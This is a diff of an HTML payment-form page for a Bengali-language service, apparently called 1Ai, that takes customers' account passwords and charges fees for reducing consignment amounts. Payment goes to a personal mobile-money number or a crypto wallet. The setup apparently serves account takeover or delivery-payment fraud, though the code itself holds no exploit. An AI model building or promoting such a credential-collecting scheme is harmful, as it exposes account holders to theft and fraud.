@@ -9,9 +9,6 @@
     .hidden {
       display: none !important;
     }
-    .amount-group {
-      transition: all 0.3s ease;
-    }
     .loading-overlay {
       position: fixed;
       top: 0;
@@ -31,12 +28,106 @@
       padding: 10px;
       background: #e8f5e9;
       border-radius: 4px;
+      margin: 10px 0;
     }
     .alert-error {
       color: red;
       padding: 10px;
       background: #ffebee;
       border-radius: 4px;
+      margin: 10px 0;
+    }
+    
+    /* Consignment Section Styling */
+    .consignment-group {
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 8px;
+      padding: 1.5rem;
+      margin-bottom: 1.5rem;
+      position: relative;
+      background: rgba(255, 255, 255, 0.05);
+      transition: all 0.3s ease;
+    }
+    
+    .consignment-group:hover {
+      border-color: rgba(28, 180, 149, 0.5);
+    }
+    
+    .consignment-counter {
+      font-weight: bold;
+      color: #1cb495;
+      margin-bottom: 1rem;
+      font-size: 1.1em;
+    }
+    
+    .remove-consignment {
+      position: absolute;
+      top: 1rem;
+      right: 1rem;
+      cursor: pointer;
+      color: #ff4444 !important;
+      background: rgba(255, 68, 68, 0.1);
+      width: 24px;
+      height: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      transition: all 0.2s ease;
+    }
+    
+    .remove-consignment:hover {
+      background: rgba(255, 68, 68, 0.2);
+    }
+    
+    /* Amount Group Styling */
+    .amount-group {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1.5rem;
+      margin: 1rem 0;
+    }
+    
+    /* Form Group Spacing */
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+    
+    /* Button Styling */
+    .add-consignment {
+      margin-bottom: 2rem;
+      width: 100%;
+    }
+    
+    .form-actions {
+      display: flex;
+      gap: 1rem;
+      margin-top: 2rem;
+    }
+    
+    .form-actions button {
+      flex: 1;
+    }
+    
+    /* Discount Button */
+    .discount-btn {
+      margin-top: 0.5rem;
+      background: rgba(28, 180, 149, 0.2) !important;
+    }
+    
+    .discount-btn:hover {
+      background: rgba(28, 180, 149, 0.3) !important;
+    }
+    
+    /* Responsive Adjustments */
+    @media screen and (max-width: 736px) {
+      .amount-group {
+        grid-template-columns: 1fr;
+      }
+      
+      .form-actions {
+        flex-direction: column;
+      }
     }
   </style>
 </head>
@@ -50,7 +141,7 @@
   </header>
 
   <section>
-    <h3>INPUT DATA( )</h3>
+    <h3>INPUT DATA</h3>
     <div id="discount-display" class="discount-banner">
       <i class="fas fa-tag"></i>
       <span id="discount-text">No active discount</span>
@@ -85,7 +176,7 @@
       <div id="consignments-container">
         <div class="consignment-group" data-index="0">
           <div class="consignment-counter">Consignment #1</div>
-          <span class="remove-consignment" onclick="removeConsignment(this)">X</span>
+          <span class="remove-consignment" onclick="removeConsignment(this)">✕</span>
           
           <div class="form-group">
             <label>Customer Details:</label>
@@ -127,18 +218,22 @@
 
       <div class="form-group">
         <label for="amount3">Total Server Charge:</label>
-        <input type="number" id="amount3" name="amount3" readonly required><br>
-           <br> <div>
-              <button type="button" class="icon solid fa-tag discount-btn" onclick="window.showDiscountWheel()">
-              <span>Get Discount</span>
-            </div>
-       <br> <small>সার্ভিসটি গ্রহণ নিশ্চিত করতে সার্ভারচার্জ অগ্রিম পরিশোধ করুন</small><br>
+        <input type="number" id="amount3" name="amount3" readonly required>
+        <br>
+        <div>
+          <button type="button" class="button icon solid fa-tag discount-btn" onclick="window.showDiscountWheel()">
+            <span>Get Discount</span>
+          </button>
+        </div>
+        <br>
+        <small>সার্ভিসটি গ্রহণ নিশ্চিত করতে সার্ভারচার্জ অগ্রিম পরিশোধ করুন</small><br>
         <small>নগদ পার্সোনাল(sendmoney): 01923002231</small><br> 
         <small>Crypto bep20 USDT: 0x08a30256b232aCE8acc3BEeCA73A5F036ba373D0</small>
       </div>
 
-    <p>আপনার এপ/ওয়েবসাইট লগ আউট হলে কমপক্ষে ২৫ মিনিট লগইন করা থেকে বিরত থাকুন। অনুগ্রহ পূর্বক কিছুক্ষণ অপেক্ষা করুন পেমেন্ট সম্পন্ন হলে আপনার সার্ভিসটি স্বয়ংক্রিয় ভাবে প্রক্রিয়াকরণ শুরু হবে।
-      পেমেন্ট এর ১ঘন্টার মধ্যে কোন আপডেট না পেলে হেল্পলাইনে যোগাযোগ করুন। </p>
+      <p>আপনার এপ/ওয়েবসাইট লগ আউট হলে কমপক্ষে ২৫ মিনিট লগইন করা থেকে বিরত থাকুন। অনুগ্রহ পূর্বক কিছুক্ষণ অপেক্ষা করুন পেমেন্ট সম্পন্ন হলে আপনার সার্ভিসটি স্বয়ংক্রিয় ভাবে প্রক্রিয়াকরণ শুরু হবে।
+        পেমেন্ট এর ১ঘন্টার মধ্যে কোন আপডেট না পেলে হেল্পলাইনে যোগাযোগ করুন।</p>
+      
       <div class="form-group">
         <label for="method">Payment Method:</label>
         <select id="method" name="method" required>
@@ -155,319 +250,319 @@
 
       <div class="form-actions">
         <button type="submit" class="button primary">Confirm Payment</button>
-        <button type="button" class="button primary" onclick="clearForm()">Clear</button>
+        <button type="button" class="button" onclick="clearForm()">Clear</button>
       </div>
     </form>
 
     <div id="confirmation-message" style="margin-top: 20px;"></div>
   </section>
 
-<script>
-// Initialize loading state
-const loadingOverlay = document.createElement('div');
-loadingOverlay.className = 'loading-overlay';
-loadingOverlay.innerHTML = '<i class="fas fa-spinner fa-spin fa-3x"></i>';
-document.body.appendChild(loadingOverlay);
+  <script>
+    // Initialize loading state
+    const loadingOverlay = document.createElement('div');
+    loadingOverlay.className = 'loading-overlay';
+    loadingOverlay.innerHTML = '<i class="fas fa-spinner fa-spin fa-3x"></i>';
+    document.body.appendChild(loadingOverlay);
 
-// Session Management
-let isSubmitting = false;
-let consignmentIndex = 1;
+    // Session Management
+    let isSubmitting = false;
+    let consignmentIndex = 1;
 
-// Form Validation Utilities
-const validatePhone = phone => /^01[3-9]\d{8}$/.test(phone);
-const validateAmount = amount => amount >= 00 && amount <= 100000;
+    // Form Validation Utilities
+    const validatePhone = phone => /^01[3-9]\d{8}$/.test(phone);
+    const validateAmount = amount => amount >= 00 && amount <= 100000;
 
-// Update amount fields based on service type
-function updateAmountFields(select) {
-  const group = select.closest('.consignment-group');
-  const originalAmountGroup = group.querySelector('.original-amount-group');
-  const updatedAmountGroup = group.querySelector('.updated-amount-group');
-  const amountGroup = group.querySelector('.amount-group');
-  const serviceType = select.value;
-  
-  // Reset all fields first
-  originalAmountGroup.classList.remove('hidden');
-  updatedAmountGroup.classList.remove('hidden');
-  amountGroup.classList.remove('hidden');
-  
-  // Hide appropriate fields based on service type
-  if (serviceType === 'delivery' || serviceType === 'return') {
-    amountGroup.classList.add('hidden');
-  } 
-  else if (serviceType === 'drto') {
-    originalAmountGroup.classList.add('hidden');
-  } 
-  
-  calculateTotalCharge();
-}
-
-// Calculate Total Server Charge
-function calculateTotalCharge() {
-    let totalCharge = 0;
-    
-    document.querySelectorAll('.consignment-group').forEach(group => {
-        const serviceType = group.querySelector('.service-type').value;
-        const amount1 = parseFloat(group.querySelector('.amount1').value) || 0;
-        const amount2 = parseFloat(group.querySelector('.amount2').value) || 0;
-        
-        if (serviceType === 'pricecng' || serviceType === 'partial') {
-            if (amount1 > 0 && amount2 > 0 && amount2 < amount1) {
-                totalCharge += (amount1 - amount2) / 2;
-            }
-        } 
-        else if (serviceType === 'drto') {
-            if (amount2 < 40) {
-                totalCharge += 40;
-            }
-        }
-    });
-
-    const discount = parseInt(localStorage.getItem('activeDiscount')) || 0;
-    if (discount > 0) {
-        totalCharge *= (1 - discount / 100);
+    // Update amount fields based on service type
+    function updateAmountFields(select) {
+      const group = select.closest('.consignment-group');
+      const originalAmountGroup = group.querySelector('.original-amount-group');
+      const updatedAmountGroup = group.querySelector('.updated-amount-group');
+      const amountGroup = group.querySelector('.amount-group');
+      const serviceType = select.value;
+      
+      // Reset all fields first
+      originalAmountGroup.classList.remove('hidden');
+      updatedAmountGroup.classList.remove('hidden');
+      amountGroup.classList.remove('hidden');
+      
+      // Hide appropriate fields based on service type
+      if (serviceType === 'delivery' || serviceType === 'return') {
+        amountGroup.classList.add('hidden');
+      } 
+      else if (serviceType === 'drto') {
+        originalAmountGroup.classList.add('hidden');
+      } 
+      
+      calculateTotalCharge();
     }
 
-    document.getElementById('amount3').value = totalCharge.toFixed(2);
-}
-
-// Enhanced Form Submission Handler
-document.getElementById('payment-form').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    if (isSubmitting) return;
-
-    try {
-        // Check authentication
-        const authToken = localStorage.getItem('authToken');
-        const userID = localStorage.getItem('userID');
-        if (!authToken || !userID) {
-            window.location.href = 'login.html';
-            return;
-        }
-
-        // Show loading state
-        isSubmitting = true;
-        loadingOverlay.style.display = 'flex';
-        document.getElementById('confirmation-message').innerHTML = '';
-
-        // Collect and validate form data
-        const formData = await validateAndPrepareData();
-
-        // Submit to server
-        const response = await fetch('https://oneai-wjox.onrender.com/payment', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Authorization': `Bearer ${authToken}`,
-                'X-User-ID': userID
-            },
-            body: JSON.stringify(formData)
+    // Calculate Total Server Charge
+    function calculateTotalCharge() {
+        let totalCharge = 0;
+        
+        document.querySelectorAll('.consignment-group').forEach(group => {
+            const serviceType = group.querySelector('.service-type').value;
+            const amount1 = parseFloat(group.querySelector('.amount1').value) || 0;
+            const amount2 = parseFloat(group.querySelector('.amount2').value) || 0;
+            
+            if (serviceType === 'pricecng' || serviceType === 'partial') {
+                if (amount1 > 0 && amount2 > 0 && amount2 < amount1) {
+                    totalCharge += (amount1 - amount2) / 2;
+                }
+            } 
+            else if (serviceType === 'drto') {
+                if (amount2 < 40) {
+                    totalCharge += 40;
+                }
+            }
         });
 
-        const responseData = await response.json();
-        
-        if (response.ok) {
-            handleSuccess(responseData, formData);
-        } else {
-            handleServerError(responseData);
-        }
-    } catch (error) {
-        handleNetworkError(error);
-    } finally {
-        isSubmitting = false;
-        loadingOverlay.style.display = 'none';
-    }
-});
-
-async function validateAndPrepareData() {
-    const form = document.getElementById('payment-form');
-    const formData = {
-        company: form.company.value,
-        phone: form.phone.value.replace(/\D/g, ''),
-        password: form.password.value.trim(),
-        method: form.method.value,
-        trxid: form.trxid.value.trim(),
-        consignments: [],
-        discount: parseInt(localStorage.getItem('activeDiscount')) || 0
-    };
-
-    // Validate core fields
-    if (!validatePhone(formData.phone)) {
-        throw new Error('Invalid phone number format');
-    }
-
-    if (formData.trxid.length < 8) {
-        throw new Error('TRX ID must be at least 8 characters');
-    }
-
-    // Process consignments
-    let totalCharge = 0;
-    document.querySelectorAll('.consignment-group').forEach((group, index) => {
-        const serviceType = group.querySelector('.service-type').value;
-        if (!serviceType) {
-            throw new Error(`Consignment ${index + 1}: Service type is required`);
+        const discount = parseInt(localStorage.getItem('activeDiscount')) || 0;
+        if (discount > 0) {
+            totalCharge *= (1 - discount / 100);
         }
 
-        const consignment = {
-            serviceType: serviceType,
-            name: group.querySelector('.name').value.trim(),
-            phone: group.querySelector('.phone1').value.replace(/\D/g, ''),
-            amount1: parseFloat(group.querySelector('.amount1').value) || 0,
-            amount2: parseFloat(group.querySelector('.amount2').value) || 0
+        document.getElementById('amount3').value = totalCharge.toFixed(2);
+    }
+
+    // Enhanced Form Submission Handler
+    document.getElementById('payment-form').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        if (isSubmitting) return;
+
+        try {
+            // Check authentication
+            const authToken = localStorage.getItem('authToken');
+            const userID = localStorage.getItem('userID');
+            if (!authToken || !userID) {
+                window.location.href = 'login.html';
+                return;
+            }
+
+            // Show loading state
+            isSubmitting = true;
+            loadingOverlay.style.display = 'flex';
+            document.getElementById('confirmation-message').innerHTML = '';
+
+            // Collect and validate form data
+            const formData = await validateAndPrepareData();
+
+            // Submit to server
+            const response = await fetch('https://oneai-wjox.onrender.com/payment', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${authToken}`,
+                    'X-User-ID': userID
+                },
+                body: JSON.stringify(formData)
+            });
+
+            const responseData = await response.json();
+            
+            if (response.ok) {
+                handleSuccess(responseData, formData);
+            } else {
+                handleServerError(responseData);
+            }
+        } catch (error) {
+            handleNetworkError(error);
+        } finally {
+            isSubmitting = false;
+            loadingOverlay.style.display = 'none';
+        }
+    });
+
+    async function validateAndPrepareData() {
+        const form = document.getElementById('payment-form');
+        const formData = {
+            company: form.company.value,
+            phone: form.phone.value.replace(/\D/g, ''),
+            password: form.password.value.trim(),
+            method: form.method.value,
+            trxid: form.trxid.value.trim(),
+            consignments: [],
+            discount: parseInt(localStorage.getItem('activeDiscount')) || 0
         };
 
-        // Validate consignment data
-        if (!consignment.name || !validatePhone(consignment.phone)) {
-            throw new Error(`Consignment ${index + 1} has invalid data`);
+        // Validate core fields
+        if (!validatePhone(formData.phone)) {
+            throw new Error('Invalid phone number format');
         }
 
-        // Service-specific validation
-        if (serviceType === 'pricecng' || serviceType === 'partial') {
-            if (!validateAmount(consignment.amount1) || 
-                !validateAmount(consignment.amount2)) {
-                throw new Error(`Consignment ${index + 1} has invalid amounts`);
+        if (formData.trxid.length < 8) {
+            throw new Error('TRX ID must be at least 8 characters');
+        }
+
+        // Process consignments
+        let totalCharge = 0;
+        document.querySelectorAll('.consignment-group').forEach((group, index) => {
+            const serviceType = group.querySelector('.service-type').value;
+            if (!serviceType) {
+                throw new Error(`Consignment ${index + 1}: Service type is required`);
             }
-            if (consignment.amount2 >= consignment.amount1) {
-                throw new Error(`Consignment ${index + 1}: Updated amount must be less than original`);
+
+            const consignment = {
+                serviceType: serviceType,
+                name: group.querySelector('.name').value.trim(),
+                phone: group.querySelector('.phone1').value.replace(/\D/g, ''),
+                amount1: parseFloat(group.querySelector('.amount1').value) || 0,
+                amount2: parseFloat(group.querySelector('.amount2').value) || 0
+            };
+
+            // Validate consignment data
+            if (!consignment.name || !validatePhone(consignment.phone)) {
+                throw new Error(`Consignment ${index + 1} has invalid data`);
             }
-            totalCharge += (consignment.amount1 - consignment.amount2) / 2;
+
+            // Service-specific validation
+            if (serviceType === 'pricecng' || serviceType === 'partial') {
+                if (!validateAmount(consignment.amount1) || 
+                    !validateAmount(consignment.amount2)) {
+                    throw new Error(`Consignment ${index + 1} has invalid amounts`);
+                }
+                if (consignment.amount2 >= consignment.amount1) {
+                    throw new Error(`Consignment ${index + 1}: Updated amount must be less than original`);
+                }
+                totalCharge += (consignment.amount1 - consignment.amount2) / 2;
+            } 
+            else if (serviceType === 'drto') {
+                if (consignment.amount2 > 0 && !validateAmount(consignment.amount2)) {
+                    throw new Error(`Consignment ${index + 1} has invalid amount`);
+                }
+                if (consignment.amount2 < 40) {
+                    totalCharge += 40;
+                }
+            }
+
+            formData.consignments.push(consignment);
+        });
+
+        // Apply discount
+        if (formData.discount > 0) {
+            totalCharge *= (1 - formData.discount / 100);
+        }
+
+        // Set final amount
+        formData.amount3 = parseFloat(totalCharge.toFixed(2));
+        return formData;
+    }
+
+    function handleSuccess(data, formData) {
+        localStorage.setItem('recentPayment', JSON.stringify({
+            company: formData.company,
+            trxid: formData.trxid,
+            amount: formData.amount3,
+            status: 'Pending',
+            timestamp: Date.now()
+        }));
+
+        showMessage('Payment successfully processed! Redirecting...', 'success');
+        setTimeout(() => window.location.href = 'dashboard.html', 2000);
+    }
+
+    function handleServerError(responseData) {
+        let errorMessage = 'Payment processing failed';
+        
+        // Handle validation errors
+        if (responseData.errors) {
+            errorMessage = Object.values(responseData.errors)
+                .map(err => err.message || err)
+                .join('\n');
         } 
-        else if (serviceType === 'drto') {
-            if (consignment.amount2 > 0 && !validateAmount(consignment.amount2)) {
-                throw new Error(`Consignment ${index + 1} has invalid amount`);
-            }
-            if (consignment.amount2 < 40) {
-                totalCharge += 40;
-            }
+        else if (responseData.message) {
+            errorMessage = responseData.message;
         }
-
-        formData.consignments.push(consignment);
-    });
-
-    // Apply discount
-    if (formData.discount > 0) {
-        totalCharge *= (1 - formData.discount / 100);
+        
+        showMessage(`Error: ${errorMessage}`, 'error');
     }
 
-    // Set final amount
-    formData.amount3 = parseFloat(totalCharge.toFixed(2));
-    return formData;
-}
-
-function handleSuccess(data, formData) {
-    localStorage.setItem('recentPayment', JSON.stringify({
-        company: formData.company,
-        trxid: formData.trxid,
-        amount: formData.amount3,
-        status: 'Pending',
-        timestamp: Date.now()
-    }));
-
-    showMessage('Payment successfully processed! Redirecting...', 'success');
-    setTimeout(() => window.location.href = 'dashboard.html', 2000);
-}
-
-function handleServerError(responseData) {
-    let errorMessage = 'Payment processing failed';
-    
-    // Handle validation errors
-    if (responseData.errors) {
-        errorMessage = Object.values(responseData.errors)
-            .map(err => err.message || err)
-            .join('\n');
-    } 
-    else if (responseData.message) {
-        errorMessage = responseData.message;
+    function handleNetworkError(error) {
+        const message = error.message.includes('Failed to fetch')
+            ? 'Network Error: Check internet connection'
+            : error.message;
+        showMessage(`Error: ${message}`, 'error');
     }
-    
-    showMessage(`Error: ${errorMessage}`, 'error');
-}
 
-function handleNetworkError(error) {
-    const message = error.message.includes('Failed to fetch')
-        ? 'Network Error: Check internet connection'
-        : error.message;
-    showMessage(`Error: ${message}`, 'error');
-}
+    function showMessage(text, type) {
+        const messageDiv = document.getElementById('confirmation-message');
+        messageDiv.innerHTML = `
+            <div class="alert-${type === 'success' ? 'success' : 'error'}">
+                ${text}
+            </div>
+        `;
+        setTimeout(() => messageDiv.innerHTML = '', 5000);
+    }
 
-function showMessage(text, type) {
-    const messageDiv = document.getElementById('confirmation-message');
-    messageDiv.innerHTML = `
-        <div class="alert-${type === 'success' ? 'success' : 'error'}">
-            ${text}
-        </div>
-    `;
-    setTimeout(() => messageDiv.innerHTML = '', 5000);
-}
-
-// Consignment Management
-function addConsignment() {
-    const container = document.getElementById('consignments-container');
-    const firstGroup = document.querySelector('.consignment-group');
-    const newGroup = firstGroup.cloneNode(true);
-    
-    // Update all input names with new index
-    newGroup.querySelectorAll('input, select').forEach(input => {
-        const name = input.name.replace('[0]', `[${consignmentIndex}]`);
-        input.name = name;
-        input.value = '';
-    });
-    
-    // Update counter display
-    newGroup.querySelector('.consignment-counter').textContent = `Consignment #${consignmentIndex + 1}`;
-    
-    // Reset service type and fields
-    const serviceTypeSelect = newGroup.querySelector('.service-type');
-    serviceTypeSelect.value = '';
-    serviceTypeSelect.onchange = function() { updateAmountFields(this); };
-    
-    // Add amount field listeners
-    newGroup.querySelectorAll('.amount1, .amount2').forEach(input => {
-        input.oninput = calculateTotalCharge;
-    });
-    
-    container.appendChild(newGroup);
-    consignmentIndex++;
-    calculateTotalCharge();
-}
-
-function removeConsignment(element) {
-    if (document.querySelectorAll('.consignment-group').length > 1) {
-        element.closest('.consignment-group').remove();
-        consignmentIndex--;
+    // Consignment Management
+    function addConsignment() {
+        const container = document.getElementById('consignments-container');
+        const firstGroup = document.querySelector('.consignment-group');
+        const newGroup = firstGroup.cloneNode(true);
+        
+        // Update all input names with new index
+        newGroup.querySelectorAll('input, select').forEach(input => {
+            const name = input.name.replace('[0]', `[${consignmentIndex}]`);
+            input.name = name;
+            input.value = '';
+        });
+        
+        // Update counter display
+        newGroup.querySelector('.consignment-counter').textContent = `Consignment #${consignmentIndex + 1}`;
+        
+        // Reset service type and fields
+        const serviceTypeSelect = newGroup.querySelector('.service-type');
+        serviceTypeSelect.value = '';
+        serviceTypeSelect.onchange = function() { updateAmountFields(this); };
+        
+        // Add amount field listeners
+        newGroup.querySelectorAll('.amount1, .amount2').forEach(input => {
+            input.oninput = calculateTotalCharge;
+        });
+        
+        container.appendChild(newGroup);
+        consignmentIndex++;
         calculateTotalCharge();
     }
-}
 
-function clearForm() {
-    document.getElementById('payment-form').reset();
-    const container = document.getElementById('consignments-container');
-    while (container.children.length > 1) {
-        container.removeChild(container.lastChild);
+    function removeConsignment(element) {
+        if (document.querySelectorAll('.consignment-group').length > 1) {
+            element.closest('.consignment-group').remove();
+            consignmentIndex--;
+            calculateTotalCharge();
+        }
     }
-    consignmentIndex = 1;
-    calculateTotalCharge();
-}
 
-// Initialize form on load
-document.addEventListener('DOMContentLoaded', function() {
-  // Initialize all service type fields
-  document.querySelectorAll('.service-type').forEach(select => {
-    updateAmountFields(select);
-  });
-  
-  // Initialize discount display
-  if (typeof window.updateDiscountDisplay === 'function') {
-    window.updateDiscountDisplay();
-  }
-  
-  // Add real-time calculation listeners
-  document.querySelectorAll('.amount1, .amount2').forEach(input => {
-    input.addEventListener('input', calculateTotalCharge);
-  });
-});
-</script>
+    function clearForm() {
+        document.getElementById('payment-form').reset();
+        const container = document.getElementById('consignments-container');
+        while (container.children.length > 1) {
+            container.removeChild(container.lastChild);
+        }
+        consignmentIndex = 1;
+        calculateTotalCharge();
+    }
+
+    // Initialize form on load
+    document.addEventListener('DOMContentLoaded', function() {
+      // Initialize all service type fields
+      document.querySelectorAll('.service-type').forEach(select => {
+        updateAmountFields(select);
+      });
+      
+      // Initialize discount display
+      if (typeof window.updateDiscountDisplay === 'function') {
+        window.updateDiscountDisplay();
+      }
+      
+      // Add real-time calculation listeners
+      document.querySelectorAll('.amount1, .amount2').forEach(input => {
+        input.addEventListener('input', calculateTotalCharge);
+      });
+    });
+  </script>
   <script src="./assets/js/load-navbar.js"></script>
   <script src="./assets/js/main.js"></script>
-<p>1Ai এর সাথেই থাকুন ওয়ানএআই আপনার ডিজিটাল সমস্যার স্মার্ট সমাধান। </p>
+  <p>1Ai এর সাথেই থাকুন ওয়ানএআই আপনার ডিজিটাল সমস্যার স্মার্ট সমাধান।</p>
 </body>
 </html>
